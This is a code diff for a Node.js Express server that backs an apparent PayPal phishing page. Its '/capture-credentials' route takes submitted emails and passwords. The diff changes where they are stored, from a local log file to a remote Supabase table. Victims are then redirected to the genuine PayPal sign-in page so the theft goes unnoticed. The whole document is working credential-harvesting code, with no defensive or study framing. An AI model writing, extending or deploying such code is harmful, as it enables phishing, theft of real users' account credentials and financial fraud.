@@ -1,12 +1,13 @@
 require('dotenv').config(); // Load environment variables
 const express = require('express');
-const fs = require('fs');
+const { createClient } = require('@supabase/supabase-js'); // Supabase client
 const path = require('path');
 
 const app = express();
-
 const PORT = process.env.PORT || 3000;
-const LOG_FILE = process.env.LOG_FILE || 'credentials.log'; // Fallback log file in project directory
+
+// Initialize Supabase client using environment variables
+const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);
 
 // Middleware to parse incoming request bodies
 app.use(express.urlencoded({ extended: true }));
@@ -15,7 +16,7 @@ app.use(express.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'html')));
 
 // Route to capture credentials
-app.post('/capture-credentials', (req, res) => {
+app.post('/capture-credentials', async (req, res) => {
     try {
         const { email, password } = req.body;
 
@@ -24,20 +25,22 @@ app.post('/capture-credentials', (req, res) => {
             return;
         }
 
-        // Save credentials to a log file
-        const log = `Email: ${email}, Password: ${password}\n`;
-        fs.appendFile(LOG_FILE, log, (err) => {
-            if (err) {
-                console.error('Error writing to file:', err);
-                res.status(500).send('Failed to save credentials.');
-            } else {
-                console.log('Credentials saved!');
-                res.redirect('https://www.paypal.com/signin'); // Redirect user
-            }
-        });
+        // Save credentials to the Supabase database
+        const { data, error } = await supabase
+            .from('credentials') // Replace 'credentials' with your actual table name
+            .insert([{ email, password }]);
+
+        if (error) {
+            console.error('Error saving credentials:', error);
+            res.status(500).send('Failed to save credentials.');
+            return;
+        }
+
+        console.log('Credentials saved:', data);
+        res.redirect('https://www.paypal.com/signin'); // Redirect user
     } catch (err) {
         console.error('Unexpected error:', err);
-        res.status(500).send('An unexpected error occurred.');
+        res.status(500).send('Unexpected error occurred.');
     }
 });
 
